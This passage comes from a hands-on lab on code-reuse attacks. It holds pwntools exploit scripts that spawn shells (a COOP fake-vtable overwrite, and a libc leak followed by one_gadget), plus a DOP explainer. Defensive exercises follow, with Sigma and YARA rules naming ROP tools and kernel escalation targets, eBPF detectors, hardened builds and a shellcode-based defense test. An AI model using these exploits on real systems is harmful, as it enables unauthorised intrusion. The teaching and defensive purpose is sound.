    #   [0x48]: pointer to Commander::execute (or system@PLT directly)

    fake_vtable_offset = 0x48
    fake_vtable_addr = widget0_addr + fake_vtable_offset

    overwrite  = p64(fake_vtable_addr)           # vtable pointer
    overwrite += b"/bin/sh\x00"                  # this->cmd at offset 0x08
    overwrite  = overwrite.ljust(fake_vtable_offset, b"\x00")
    # Fake vtable: first entry is the function called by execute()
    overwrite += p64(SYSTEM_PLT)                 # vtable[0] = system

    overwrite = overwrite.ljust(256, b"\x00")

    log.info(f"Overwrite size: {len(overwrite)} bytes")
    log.info(f"Fake vtable at: {hex(fake_vtable_addr)}")
    log.info(f"system@PLT: {hex(SYSTEM_PLT)}")

    p.sendafter(b"Overwrite widget[0] data", overwrite)

    # When the dispatch loop calls widget[0]->execute():
    # 1. Read vtable ptr from object[0x00] → fake_vtable_addr
    # 2. Read vtable[0] → system@PLT
    # 3. Call system with this pointer → this->cmd = "/bin/sh"
    # Note: system(this) where this points to "/bin/sh" at offset 0x08...
    # Actually the 'this' pointer is the object base, and Commander::execute
    # accesses this->cmd which is at this+0x08.
    # If we call system@PLT directly, rdi = this (object base).
    # We need rdi = &"/bin/sh" which is at object+0x08, not object+0x00.
    #
    # Fix: put "/bin/sh\x00" at offset 0x00 (where vtable ptr should be)
    # But then vtable ptr is wrong...
    #
    # Real COOP approach: use the ACTUAL Commander vtable (which calls
    # system(this->cmd) where cmd is at the correct offset).
    # The program already has Commander::execute compiled in!

    log.info("For clean COOP: use the real Commander vtable address")
    log.info("The dispatch loop then calls real Commander::execute()")
    log.info("which reads this->cmd (our '/bin/sh') and calls system()")

p.interactive()
```

**COOP significance:** Every virtual dispatch is legitimate — forward-edge CFI (that only checks "is this a valid function start?") cannot distinguish COOP from normal polymorphic dispatch. Defense requires fine-grained type-based CFI (Clang `-fsanitize=cfi-vcall`).

---

### Exercise 8: One-Gadget, Advanced Techniques, and Data-Oriented Programming

**Objective:** Use one_gadget for single-address exploitation, understand DOP concepts, and chain advanced techniques.

#### Step 8.1: One-Gadget Exploitation

```python
#!/usr/bin/env python3
"""
Exercise 8.1: one_gadget — single-address shell acquisition.
Replaces entire ROP chain with a single libc address (if constraints are met).
"""
from pwn import *
import subprocess

context.binary = elf = ELF("./vuln_rop_basic")
libc = ELF(elf.libc.path)
context.log_level = "info"

# Find one_gadgets in the target libc
result = subprocess.run(
    ["one_gadget", elf.libc.path],
    capture_output=True, text=True
)
log.info(f"one_gadget output:\n{result.stdout}")

# Parse one_gadget output to extract offsets and constraints
# Typical format:
# 0x4f2a5 execve("/bin/sh", rsp+0x40, environ)
# constraints:
#   rsp & 0xf == 0
#   rcx == NULL
one_gadgets = []
lines = result.stdout.strip().split('\n')
i = 0
while i < len(lines):
    line = lines[i].strip()
    if line.startswith('0x'):
        offset = int(line.split()[0], 16)
        constraints = []
        i += 1
        while i < len(lines) and not lines[i].strip().startswith('0x'):
            if lines[i].strip().startswith('[') or '==' in lines[i] or '&' in lines[i]:
                constraints.append(lines[i].strip())
            i += 1
        one_gadgets.append((offset, constraints))
    else:
        i += 1

for offset, constraints in one_gadgets:
    log.info(f"  {hex(offset)}: {constraints}")

# Standard two-stage: leak libc first, then overwrite ret with one_gadget
p = process("./vuln_rop_basic")

# Stage 1: leak (same as Exercise 1)
rop = ROP(elf)
POP_RDI = rop.find_gadget(['pop rdi', 'ret'])[0]
RET = rop.find_gadget(['ret'])[0]

payload1  = b"A" * 72
payload1 += p64(POP_RDI)
payload1 += p64(elf.got["puts"])
payload1 += p64(elf.plt["puts"])
payload1 += p64(elf.symbols["main"])

p.sendafter(b"Input: ", payload1)
leaked = u64(p.recvline().strip().ljust(8, b"\x00"))
libc.address = leaked - libc.symbols["puts"]
log.success(f"libc base: {hex(libc.address)}")

# Stage 2: one_gadget (try each until one works)
for offset, constraints in one_gadgets:
    one_gadget_addr = libc.address + offset
    log.info(f"Trying one_gadget at {hex(one_gadget_addr)}")
    log.info(f"  Constraints: {constraints}")

    # Some one_gadgets need stack alignment (RET before them)
    payload2  = b"A" * 72
    payload2 += p64(RET)              # alignment (helps satisfy rsp & 0xf == 0)
    payload2 += p64(one_gadget_addr)  # single address = entire exploit!

    p.sendafter(b"Input: ", payload2)
    break  # try the first one

log.success("If constraints are satisfied, shell is obtained!")
p.interactive()
```

#### Step 8.2: Data-Oriented Programming (DOP) Conceptual Lab

```python
#!/usr/bin/env python3
"""
Exercise 8.2: Data-Oriented Programming (DOP) — conceptual demonstration.
DOP corrupts DATA (not control flow) to achieve attacker goals.
No function pointers, return addresses, or vtables are modified.

This demonstrates the concept with a vulnerable dispatcher loop.
"""

# DOP attack model (pseudocode, not a binary exploit):
#
# Target program has a loop that processes configuration entries:
#
#   struct config_entry {
#       int type;           // operation selector
#       int src_idx;        // source array index
#       int dst_idx;        // destination array index
#       int value;          // immediate value
#   };
#
#   int data[256];
#   struct config_entry entries[64];
#   int num_entries;
#
#   // Dispatch loop (legitimate program code)
#   for (int i = 0; i < num_entries; i++) {
#       switch (entries[i].type) {
#           case 0: data[entries[i].dst_idx] = data[entries[i].src_idx]; break; // COPY
#           case 1: data[entries[i].dst_idx] += entries[i].value; break;        // ADD
#           case 2: data[entries[i].dst_idx] = entries[i].value; break;         // SET
#           case 3: if (data[entries[i].src_idx]) i = entries[i].value; break;  // COND_JMP
#       }
#   }
#
# DOP Attack: corrupt entries[] and num_entries to create a "program"
# that executes arbitrary read/write/arithmetic using the existing loop.
#
# DOP "gadgets" are the case statements:
#   - case 0 = memory-to-memory copy (arbitrary read primitive)
#   - case 1 = addition (arbitrary arithmetic)
#   - case 2 = immediate write (arbitrary write primitive)
#   - case 3 = conditional (Turing-complete control)
#
# Example DOP chain to overwrite uid=0 (privilege escalation):
#   entries[0] = {type=2, dst_idx=UID_OFFSET, value=0}  // set uid=0
#   entries[1] = {type=2, dst_idx=GID_OFFSET, value=0}  // set gid=0
#   num_entries = 2
#
# CFI cannot detect this: all branches are legitimate. All calls go to
# their intended targets. Only DATA values are corrupted.

print("""
=== Data-Oriented Programming (DOP) — Conceptual Exercise ===

DOP Key Principles:
1. NO control-flow hijack — all branches remain legitimate
2. Corrupt loop-controlling DATA: iteration counts, array indices, pointer fields
3. "Gadgets" are legitimate code paths in the loop body
4. Loop back-edge is the "dispatcher" (like ROP's ret)
5. Turing-complete with: read, write, arithmetic, conditional gadgets

DOP vs ROP comparison:
┌─────────────┬────────────────────┬─────────────────────┐
│ Property    │ ROP                │ DOP                 │
├─────────────┼────────────────────┼─────────────────────┤
│ Corrupts    │ Return addresses   │ Data variables      │
│ Chains via  │ ret instruction    │ Loop back-edge      │
│ Gadgets     │ Code fragments     │ Loop body paths     │
│ Detected by │ Shadow stack, CFI  │ Data-flow integrity │
│ Defeated by │ CET, PAC, IBT      │ DFI, MTE (partial)  │
└─────────────┴────────────────────┴─────────────────────┘

Real-world DOP examples:
- CVE-2016-5195 (Dirty COW): data-only race, no control-flow change
- CVE-2023-4911 (Looney Tunables): corrupt link_map chain in ld.so
- Nginx CVE-2013-2028: corrupt connection struct fields

Defense: Data-Flow Integrity (DFI) — 10-50% overhead, impractical at scale.
Partial defense: ARM MTE (probabilistic tag checking on memory access).
""")
```

---

## PART B: DEFENSIVE — Protection Systems

### Exercise 9: Detection Engineering — Sigma, YARA, HPC, and Intel PT

**Objective:** Build production-grade detection artifacts for code reuse attacks across multiple telemetry sources.

#### Step 9.1: Sigma Rules for Code Reuse Detection

```yaml
# Save as: ~/code_reuse_lab/detection/sigma_code_reuse.yml

# Rule 1: ROP gadget tool execution on production host
title: ROP Gadget Discovery Tool Execution
id: 9e4f3b21-d8f2-5c6b-0a7e-2b3c4d5e6f70
status: stable
description: |
    Detects execution of known ROP gadget discovery tools on a host.
    Indicates active exploit development or unauthorized binary analysis.
logsource:
    category: process_creation
    product: linux
detection:
    selection_image:
        Image|endswith:
            - "/ROPgadget"
            - "/ropper"
            - "/rp++"
            - "/rp-lin"
            - "/xrop"
            - "/one_gadget"
            - "/angrop"
    selection_cmdline:
        CommandLine|contains:
            - "ROPgadget"
            - "ropper -f"
            - "ropper --file"
            - "rp++ -f"
            - "rp-lin -f"
            - "one_gadget"
            - "--ropchain"
            - "--badbytes"
    condition: selection_image or selection_cmdline
level: medium
tags:
    - attack.resource_development
    - attack.t1587.004
falsepositives:
    - Authorized penetration testers
    - CTF competitions on personal workstations
    - Security research environments

---
# Rule 2: BROP attack pattern — rapid child crashes from forking server
title: BROP Attack Pattern - Rapid Child Process Crashes
id: a2503c32-e9f3-6d7c-1b8f-3c4d5e6f7081
status: experimental
description: |
    Detects a pattern consistent with Blind ROP (BROP) canary brute-forcing:
    many child processes of the same parent crash in rapid succession with
    SIGABRT (__stack_chk_fail) or SIGSEGV. Normal server operation produces
    no more than 1-2 crashes per minute.
logsource:
    product: linux
    service: auditd
detection:
    selection:
        type: ANOM_ABEND
    filter_normal:
        # Allow up to 5 crashes per 60 seconds (normal threshold)
    timeframe: 60s
    condition: selection | count(pid) by ppid > 10
level: critical
tags:
    - attack.execution
    - attack.t1190
falsepositives:
    - Load testing that intentionally triggers errors
    - Application bug causing repeated crashes (investigate!)

---
# Rule 3: Stack pivot detection via crash dump analysis
title: Stack Pivot Detected in Process Crash
id: b1604d43-fa03-7e8d-2c9f-4d5e6f708192
status: experimental
description: |
    Detects a process crash where RSP points outside the thread's stack VMA,
    indicating a stack pivot — typically the first step in ROP chain execution
    when the initial overflow is too small for the full chain.
logsource:
    product: linux
    service: coredump
detection:
    selection_crash:
        EventType: "core_dump"
    selection_pivot:
        Signal:
            - "SIGSEGV"
            - "SIGBUS"
    # Custom field from coredump analyzer:
    selection_rsp_anomaly:
        StackPointerInStackVMA: false
    condition: selection_crash and selection_pivot and selection_rsp_anomaly
level: critical
tags:
    - attack.execution
    - attack.defense_evasion
    - attack.t1055

---
# Rule 4: SROP — rt_sigreturn followed by execve/mprotect
title: SROP Exploitation Pattern - sigreturn then execve
id: c2715e54-gb14-8f9e-3d0a-5e6f70819203
status: experimental
description: |
    Detects audit log showing rt_sigreturn (syscall 15) immediately followed
    by execve (59) or mprotect with PROT_EXEC (10), indicating SROP.
    Normal signal handling never produces this pattern.
logsource:
    product: linux
    service: auditd
detection:
    selection_sigreturn:
        type: SYSCALL
        syscall: "15"
        success: "yes"
    selection_dangerous:
        type: SYSCALL
        syscall:
            - "59"   # execve
            - "10"   # mprotect
    timeframe: 1s
    condition: selection_sigreturn | near selection_dangerous
level: critical
tags:
    - attack.execution
    - attack.t1059.004

---
# Rule 5: CET Shadow Stack violation
title: CET Shadow Stack Violation
id: d3826f65-hc25-9a0f-4e1b-6f70819203a4
status: experimental
description: |
    Detects hardware shadow stack (CET) violation — return address mismatch
    between hardware shadow stack and software stack. This is an architectural
    ROP detection that CANNOT produce false positives in correct code.
logsource:
    product: linux
    service: audit
detection:
    selection:
        type: ANOM_ABEND
        sig: "31"   # SIGSYS or platform-specific CET signal
    selection_cet:
        EventData|contains:
            - "shadow_stack"
            - "control_protection"
            - "#CP"
    condition: selection or selection_cet
level: critical
tags:
    - attack.execution
    - attack.t1203
falsepositives:
    - None in production code (debuggers may trigger in dev)
```

#### Step 9.2: YARA Rules for Code Reuse Artifacts

```bash
cat > ~/code_reuse_lab/detection/yara_code_reuse.yar << 'YARA_EOF'
/* Code Reuse Attack Detection — YARA Rules
   For scanning: memory dumps, crash artifacts, network captures */

/* Rule 1: ROP chain on stack — consecutive .text addresses */
rule ROP_Chain_Stack_Pattern
{
    meta:
        description = "Consecutive code-section addresses on stack indicating ROP chain"
        severity    = "critical"
        technique   = "T1203"

    strings:
        // Three consecutive 8-byte values in 0x4000xx range (no-PIE .text)
        $noie_chain = { ?? ?? 40 00 00 00 00 00 ?? ?? 40 00 00 00 00 00 ?? ?? 40 00 00 00 00 00 }

        // Three consecutive values in 0x7fXX range (libc addresses)
        $libc_chain = { ?? ?? ?? ?? ?? 7f 00 00 ?? ?? ?? ?? ?? 7f 00 00 ?? ?? ?? ?? ?? 7f 00 00 }

        // pop rdi; ret gadget byte pattern repeated
        $pop_rdi_ret = { 5f c3 }
        $pop_rsi_ret = { 5e c3 }
        $pop_rdx_ret = { 5a c3 }
        $pop_rax_ret = { 58 c3 }
        $syscall_ret = { 0f 05 c3 }

    condition:
        ($noie_chain or $libc_chain) and
        2 of ($pop_rdi_ret, $pop_rsi_ret, $pop_rdx_ret, $pop_rax_ret, $syscall_ret)
}

/* Rule 2: SROP sigreturn frame signature */
rule SROP_Sigreturn_Frame
{
    meta:
        description = "Forged sigreturn frame with syscall setup"
        severity    = "critical"
        technique   = "T1059"

    strings:
        // SYS_rt_sigreturn = 15 (0x0f) as 8-byte LE
        $sigreturn_nr = { 0f 00 00 00 00 00 00 00 }
        // SYS_execve = 59 (0x3b) as 8-byte LE
        $execve_nr = { 3b 00 00 00 00 00 00 00 }
        // SYS_mprotect = 10 (0x0a) as 8-byte LE
        $mprotect_nr = { 0a 00 00 00 00 00 00 00 }
        // "/bin/sh"
        $binsh = "/bin/sh"
        // "///bin/sh" (common SROP variant)
        $binsh_triple = "///bin/sh"

    condition:
        $sigreturn_nr and
        ($execve_nr or $mprotect_nr) and
        ($binsh or $binsh_triple) and
        // Frame is ~248 bytes; all elements should be within 512 bytes
        @execve_nr - @sigreturn_nr < 512 or @mprotect_nr - @sigreturn_nr < 512
}

/* Rule 3: Stack pivot gadget in data region */
rule Stack_Pivot_Payload
{
    meta:
        description = "Stack pivot gadget bytes in writable/data memory"
        severity    = "critical"
        technique   = "T1055"

    strings:
        // xchg rax, rsp; ret (48 94 c3)
        $xchg_rax_rsp = { 48 94 c3 }
        // xchg eax, esp; ret (94 c3)
        $xchg_eax_esp = { 94 c3 }
        // mov rsp, rbp; pop rbp; ret = leave;ret (c9 c3)
        $leave_ret = { c9 c3 }
        // pop rsp; ret (5c c3)
        $pop_rsp = { 5c c3 }

    condition:
        2 of ($xchg_rax_rsp, $xchg_eax_esp, $leave_ret, $pop_rsp)
}

/* Rule 4: ret2dlresolve forged structures */
rule Ret2dlresolve_Forged_Structures
{
    meta:
        description = "Forged Elf64_Rela + Elf64_Sym pointing to symbol string"
        severity    = "high"
        technique   = "T1203"

    strings:
        // R_X86_64_JUMP_SLOT type (7) in r_info lower 32 bits
        $jump_slot = { 07 00 00 00 }
        // STB_GLOBAL|STT_FUNC (0x12) in st_info
        $global_func = { 12 00 }
        // Common resolved symbol names at unusual addresses
        $sym_system = "system"
        $sym_execve = "execve"
        $sym_mprotect = "mprotect"

    condition:
        $jump_slot and $global_func and
        1 of ($sym_system, $sym_execve, $sym_mprotect)
}

/* Rule 5: Kernel ROP chain artifacts */
rule Kernel_ROP_Chain
{
    meta:
        description = "Kernel-space addresses packed in user-accessible memory"
        severity    = "critical"
        technique   = "T1068"

    strings:
        // Kernel canonical address range (0xffff800000000000+)
        $kaddr_triple = { ?? ?? ?? ?? ?? ?? ff ff ?? ?? ?? ?? ?? ?? ff ff ?? ?? ?? ?? ?? ?? ff ff }
        // Common kROP targets
        $prepare_cred = "prepare_kernel_cred"
        $commit_creds = "commit_creds"
        // modprobe_path overwrite
        $modprobe = "/tmp/"

    condition:
        $kaddr_triple and ($prepare_cred or $commit_creds or $modprobe)
}

/* Rule 6: Pwntools-generated exploit artifacts */
rule Pwntools_Exploit_Artifact
{
    meta:
        description = "Pwntools exploit payload markers in memory"
        severity    = "medium"
        technique   = "T1587.004"

    strings:
        // pwntools flat() padding patterns
        $pwn_padding = "aaaabaaacaaadaaa"
        // De Bruijn cycle pattern (pwntools cyclic())
        $cyclic = "aaaaaaaabaaaaaaacaaaaaaadaaaaaaa"
        // pwntools ROP chain dump marker
        $rop_dump = "0x0000:"

    condition:
        any of them
}
YARA_EOF

echo "[+] YARA rules written to ~/code_reuse_lab/detection/yara_code_reuse.yar"
```

#### Step 9.3: Hardware Performance Counter (HPC) ROP Detection

```bash
#!/bin/bash
# hpc_rop_detect.sh — Monitor a process for ROP chain indicators via perf counters
# Usage: ./hpc_rop_detect.sh <PID>

PID=${1:?Usage: $0 <PID>}
SAMPLE_MS=5000

echo "[*] Monitoring PID $PID for ROP indicators (${SAMPLE_MS}ms sample)..."

# Key counters:
# - br_ret_retired: total ret instructions
# - br_inst_retired: total branch instructions
# - br_misp_retired: mispredicted branches
# On Intel: raw events r00c4 (BR_RET_RETIRED), r00c5 (BR_RET_MISP)

perf stat -e \
    branches,branch-misses,\
    r00c4,r00c5,\
    instructions \
    -p "$PID" --timeout "$SAMPLE_MS" 2>&1 | tee /tmp/hpc_sample.txt

echo ""
echo "[*] Analyzing results..."

# Parse and compute ratios
python3 << 'PYEOF'
import re

with open('/tmp/hpc_sample.txt') as f:
    data = f.read()

def extract_counter(name, text):
    """Extract counter value from perf stat output."""
    patterns = [
        rf'([\d,]+)\s+{name}',
        rf'([\d,]+)\s+r[0-9a-f]+\s+#.*{name}',
    ]
    for pat in patterns:
        m = re.search(pat, text, re.IGNORECASE)
        if m:
            return int(m.group(1).replace(',', ''))
    return None

branches = extract_counter('branches', data)
misses = extract_counter('branch-misses', data)
instructions = extract_counter('instructions', data)

# Simple heuristic thresholds (Payer et al.)
print("=== HPC ROP Detection Analysis ===")
if branches and misses:
    miss_ratio = misses / branches if branches > 0 else 0
    print(f"Branch miss ratio: {miss_ratio:.4f}")
    if miss_ratio > 0.3:
        print("[!] HIGH branch miss ratio — possible ROP chain execution")
    else:
        print("[✓] Normal branch prediction behavior")

if instructions and branches:
    branch_density = branches / instructions if instructions > 0 else 0
    print(f"Branch density: {branch_density:.4f}")
    if branch_density > 0.2:
        print("[!] HIGH branch density — possible gadget chain")
    else:
        print("[✓] Normal branch density")

print("\nThresholds (from research):")
print("  ret_mispredicted / ret_total > 0.3 → ROP indicator")
print("  indirect_branch / total_branch > 0.5 → JOP indicator")
print("  ret_total / call_total > 2.0 → strong ROP indicator")
PYEOF
```

#### Step 9.4: eBPF-Based Kernel ROP Detection

```c
// Save as: ~/code_reuse_lab/detection/krop_detect.bpf.c
// eBPF probe: detect stack pivot when commit_creds is called

#include <vmlinux.h>
#include <bpf/bpf_helpers.h>
#include <bpf/bpf_tracing.h>

#define THREAD_SIZE 16384  // 4 pages on x86_64

struct event {
    __u32 pid;
    __u32 tgid;
    __u64 rsp;
    __u64 rip;
    __u64 stack_base;
    char comm[16];
};

struct {
    __uint(type, BPF_MAP_TYPE_RINGBUF);
    __uint(max_entries, 256 * 1024);
} events SEC(".maps");

// Alert counter for rate limiting
struct {
    __uint(type, BPF_MAP_TYPE_PERCPU_ARRAY);
    __uint(max_entries, 1);
    __type(key, __u32);
    __type(value, __u64);
} alert_count SEC(".maps");

SEC("kprobe/commit_creds")
int detect_krop_commit_creds(struct pt_regs *ctx)
{
    struct task_struct *task = (struct task_struct *)bpf_get_current_task();
    __u64 rsp = PT_REGS_SP(ctx);
    __u64 rip = PT_REGS_IP(ctx);

    // Read task's kernel stack base
    __u64 stack_ptr;
    bpf_probe_read_kernel(&stack_ptr, sizeof(stack_ptr), &task->stack);

    __u64 stack_base = stack_ptr;
    __u64 stack_end = stack_base + THREAD_SIZE;

    // Detect: RSP outside task's kernel stack → stack pivot
    if (rsp < stack_base || rsp >= stack_end) {
        struct event *e = bpf_ringbuf_reserve(&events, sizeof(*e), 0);
        if (e) {
            e->pid = bpf_get_current_pid_tgid() >> 32;
            e->tgid = bpf_get_current_pid_tgid() & 0xFFFFFFFF;
            e->rsp = rsp;
            e->rip = rip;
            e->stack_base = stack_base;
            bpf_get_current_comm(&e->comm, sizeof(e->comm));
            bpf_ringbuf_submit(e, 0);
        }
    }

    // Also check: is the caller from an unexpected location?
    // (Would need Intel PT or LBR for full chain reconstruction)

    return 0;
}

// Additional probe on prepare_kernel_cred(NULL) — classic kROP target
SEC("kprobe/prepare_kernel_cred")
int detect_krop_prepare_cred(struct pt_regs *ctx)
{
    // Check if first argument (rdi) is NULL — the escalation pattern
    __u64 arg0 = PT_REGS_PARM1(ctx);

    if (arg0 == 0) {
        // prepare_kernel_cred(NULL) = "give me root credentials"
        // This is normal for kernel threads but suspicious for user tasks
        struct task_struct *task = (struct task_struct *)bpf_get_current_task();
        __u32 uid;
        bpf_probe_read_kernel(&uid, sizeof(uid),
                              &task->real_cred->uid.val);

        if (uid != 0) {
            // Non-root process calling prepare_kernel_cred(NULL) — suspicious!
            struct event *e = bpf_ringbuf_reserve(&events, sizeof(*e), 0);
            if (e) {
                e->pid = bpf_get_current_pid_tgid() >> 32;
                e->rsp = PT_REGS_SP(ctx);
                e->rip = PT_REGS_IP(ctx);
                e->stack_base = uid;  // reuse field for uid
                bpf_get_current_comm(&e->comm, sizeof(e->comm));
                bpf_ringbuf_submit(e, 0);
            }
        }
    }
    return 0;
}

char LICENSE[] SEC("license") = "GPL";
```

```bash
# Compile and load the eBPF probe
cat > ~/code_reuse_lab/detection/build_ebpf.sh << 'EOF'
#!/bin/bash
set -euo pipefail

# Requires: bpftool, clang, kernel headers with BTF
SRCDIR=~/code_reuse_lab/detection

# Generate vmlinux.h if not present
if [ ! -f "$SRCDIR/vmlinux.h" ]; then
    bpftool btf dump file /sys/kernel/btf/vmlinux format c > "$SRCDIR/vmlinux.h"
fi

# Compile eBPF program
clang -O2 -target bpf -D__TARGET_ARCH_x86 \
    -I"$SRCDIR" \
    -c "$SRCDIR/krop_detect.bpf.c" \
    -o "$SRCDIR/krop_detect.bpf.o"

echo "[+] eBPF program compiled: $SRCDIR/krop_detect.bpf.o"
echo "[*] Load with: sudo bpftool prog load krop_detect.bpf.o /sys/fs/bpf/krop"
echo "[*] Attach with: sudo bpftool link attach kprobe name commit_creds pin /sys/fs/bpf/krop_link"
EOF
chmod +x ~/code_reuse_lab/detection/build_ebpf.sh
```

---

### Exercise 10: Mitigation Deployment — CET, CFI, PAC, and Compiler Hardening

**Objective:** Compile binaries with modern code-reuse defenses and verify their effectiveness against the attacks from Part A.

#### Step 10.1: Compiler Hardening Build Script

```bash
#!/bin/bash
# hardened_build.sh — Compile with progressive mitigation levels
set -euo pipefail

SRCDIR=~/code_reuse_lab/binaries
HARDENED_DIR=~/code_reuse_lab/binaries/hardened
mkdir -p "$HARDENED_DIR"

# Source file for testing
SRC="$SRCDIR/vuln_rop_basic.c"

echo "=== Compiling with progressive hardening levels ==="

# Level 0: Completely vulnerable (baseline)
echo "[0] No protections..."
gcc -no-pie -fno-stack-protector -z execstack -z norelro \
    -o "$HARDENED_DIR/level0_none" "$SRC"

# Level 1: NX only (W^X)
echo "[1] NX enabled..."
gcc -no-pie -fno-stack-protector -z norelro \
    -o "$HARDENED_DIR/level1_nx" "$SRC"

# Level 2: NX + Stack canary
echo "[2] NX + canary..."
gcc -no-pie -fstack-protector-strong -z norelro \
    -o "$HARDENED_DIR/level2_canary" "$SRC"

# Level 3: NX + Canary + Full RELRO
echo "[3] NX + canary + Full RELRO..."
gcc -no-pie -fstack-protector-strong -z relro -z now \
    -o "$HARDENED_DIR/level3_relro" "$SRC"

# Level 4: NX + Canary + Full RELRO + PIE
echo "[4] Full user-space (PIE + canary + RELRO)..."
gcc -pie -fPIE -fstack-protector-strong -z relro -z now \
    -o "$HARDENED_DIR/level4_pie" "$SRC"

# Level 5: Add Fortify Source + Stack Clash Protection
echo "[5] + FORTIFY_SOURCE + stack-clash..."
gcc -pie -fPIE -fstack-protector-strong -z relro -z now \
    -D_FORTIFY_SOURCE=3 -fstack-clash-protection \
    -o "$HARDENED_DIR/level5_fortify" "$SRC"

# Level 6: Add CFI (Clang only)
echo "[6] + CFI (Clang)..."
if command -v clang &>/dev/null; then
    clang -pie -fPIE -fstack-protector-strong -z relro -z now \
        -flto -fvisibility=hidden \
        -fsanitize=cfi -fsanitize=safe-stack \
        -o "$HARDENED_DIR/level6_cfi" "$SRC" 2>/dev/null || \
        echo "  [!] CFI requires LTO + visibility; may fail on simple sources"
fi

# Level 7: Shadow Call Stack (AArch64 with Clang)
echo "[7] Shadow Call Stack (AArch64)..."
if command -v clang &>/dev/null && command -v aarch64-linux-gnu-gcc &>/dev/null; then
    clang --target=aarch64-linux-gnu \
        -pie -fPIE -fstack-protector-strong \
        -fsanitize=shadow-call-stack \
        -o "$HARDENED_DIR/level7_shadowstack_arm64" "$SRC" 2>/dev/null || \
        echo "  [!] Shadow call stack requires AArch64 target"
fi

# Level 8: CET (Intel, if supported)
echo "[8] CET IBT + Shadow Stack (if CPU supports)..."
gcc -pie -fPIE -fstack-protector-strong -z relro -z now \
    -fcf-protection=full -mshstk \
    -o "$HARDENED_DIR/level8_cet" "$SRC" 2>/dev/null || \
    echo "  [!] CET compilation requires GCC 8+ with CET support"

echo ""
echo "=== Checksec comparison ==="
for bin in "$HARDENED_DIR"/level*; do
    echo "--- $(basename $bin) ---"
    checksec --file="$bin" 2>/dev/null | grep -E "RELRO|Stack|NX|PIE|FORTIFY"
done
```

#### Step 10.2: Binary Protection Auditor

```python
#!/usr/bin/env python3
"""
Exercise 10.2: Binary protection auditor — score code-reuse resilience.
"""
import subprocess
import sys
import re
from pathlib import Path

class BinaryAuditor:
    """Audit a binary's resistance to code reuse attacks."""

    CHECKS = [
        ("NX (W^X)", "nx_enabled"),
        ("Stack Canary", "canary_enabled"),
        ("Full RELRO", "full_relro"),
        ("PIE/ASLR", "pie_enabled"),
        ("FORTIFY_SOURCE", "fortify_enabled"),
        ("CET/IBT", "cet_enabled"),
        ("CFI metadata", "cfi_present"),
        ("Stack Clash Protection", "stack_clash"),
    ]

    def __init__(self, binary_path: str):
        self.path = binary_path
        self.checksec_output = self._run_checksec()
        self.readelf_output = self._run_readelf()

    def _run_checksec(self) -> str:
        try:
            return subprocess.check_output(
                ["checksec", "--file=" + self.path],
                stderr=subprocess.STDOUT, text=True
            )
        except:
            return ""

    def _run_readelf(self) -> str:
        try:
            return subprocess.check_output(
                ["readelf", "-a", self.path],
                stderr=subprocess.STDOUT, text=True
            )
        except:
            return ""

    def nx_enabled(self) -> bool:
        return "NX enabled" in self.checksec_output

    def canary_enabled(self) -> bool:
        return "Canary found" in self.checksec_output

    def full_relro(self) -> bool:
        return "Full RELRO" in self.checksec_output

    def pie_enabled(self) -> bool:
        return "PIE enabled" in self.checksec_output

    def fortify_enabled(self) -> bool:
        return "FORTIFY" in self.checksec_output or \
               "__fortify" in self.readelf_output.lower()

    def cet_enabled(self) -> bool:
        return "IBT" in self.readelf_output or \
               "SHSTK" in self.readelf_output or \
               "GNU_PROPERTY_X86_FEATURE_1_IBT" in self.readelf_output

    def cfi_present(self) -> bool:
        return "cfi" in self.readelf_output.lower() or \
               ".cfi_" in self.readelf_output

    def stack_clash(self) -> bool:
        # Heuristic: check for stack probe sequences
        try:
            disasm = subprocess.check_output(
                ["objdump", "-d", self.path],
                stderr=subprocess.STDOUT, text=True
            )
            # Stack clash protection emits page-size sub + test sequences
            return "sub    $0x1000,%rsp" in disasm
        except:
            return False

    def audit(self) -> dict:
        results = {}
        score = 0
        max_score = len(self.CHECKS)

        print(f"\n{'='*60}")
        print(f"Binary Audit: {self.path}")
        print(f"{'='*60}")

        for name, method_name in self.CHECKS:
            method = getattr(self, method_name)
            passed = method()
            results[name] = passed
            if passed:
                score += 1
                print(f"  [✓] {name}")
            else:
                print(f"  [✗] {name}")

        print(f"\n  Score: {score}/{max_score}")

        # Risk assessment
        if score <= 2:
            risk = "CRITICAL — trivially exploitable via ROP"
        elif score <= 4:
            risk = "HIGH — exploitable with info leak"
        elif score <= 6:
            risk = "MEDIUM — requires multiple primitives"
        else:
            risk = "LOW — requires advanced techniques (DOP, speculative)"

        print(f"  Risk: {risk}")

        # Attack surface analysis
        print(f"\n  Attack Surface:")
        if not results["NX (W^X)"]:
            print("    → Direct shellcode injection possible (no ROP needed)")
        if not results["Stack Canary"]:
            print("    → Direct stack overflow → ROP (no canary bypass needed)")
        if not results["Full RELRO"]:
            print("    → GOT overwrite viable")
        if not results["PIE/ASLR"]:
            print("    → Fixed addresses — no info leak needed for gadgets")
        if not results["CET/IBT"]:
            print("    → ROP/JOP chains execute without hardware detection")
        if not results["CFI metadata"]:
            print("    → No forward-edge protection (COP/COOP viable)")

        return results

if __name__ == "__main__":
    if len(sys.argv) < 2:
        print(f"Usage: {sys.argv[0]} <binary> [binary2...]")
        sys.exit(1)

    for path in sys.argv[1:]:
        auditor = BinaryAuditor(path)
        auditor.audit()
```

#### Step 10.3: Defense Effectiveness Testing

```bash
#!/bin/bash
# test_defenses.sh — Verify each mitigation blocks the corresponding attack
set -u

HARDENED=~/code_reuse_lab/binaries/hardened
EXPLOIT=~/code_reuse_lab/exploits

echo "=== Testing Defense Effectiveness ==="

# Test 1: NX blocks shellcode injection
echo ""
echo "[TEST 1] NX blocks shellcode?"
echo "  level0 (no NX): shellcode should execute"
echo "  level1 (NX): should SIGSEGV on stack execution"
# Shellcode payload that tries to execute on stack
python3 -c "
from pwn import *
context.arch = 'amd64'
# NOP sled + exit(0) shellcode
sc = asm(shellcraft.exit(42))
payload = sc.ljust(72, b'\x90') + p64(0x7fffffffe000)  # guess stack addr
sys.stdout.buffer.write(payload)
" > /tmp/shellcode_payload.bin

timeout 2 "$HARDENED/level0_none" < /tmp/shellcode_payload.bin 2>/dev/null
echo "  level0 exit: $? (42 = shellcode ran)"
timeout 2 "$HARDENED/level1_nx" < /tmp/shellcode_payload.bin 2>/dev/null
echo "  level1 exit: $? (139 = SIGSEGV = NX worked)"

# Test 2: Canary detects overflow
echo ""
echo "[TEST 2] Canary detects overflow?"
python3 -c "import sys; sys.stdout.buffer.write(b'A'*200)" | \
    timeout 2 "$HARDENED/level2_canary" 2>/dev/null
echo "  level2 exit: $? (134 = SIGABRT from __stack_chk_fail = canary worked)"

# Test 3: Full RELRO prevents GOT overwrite
echo ""
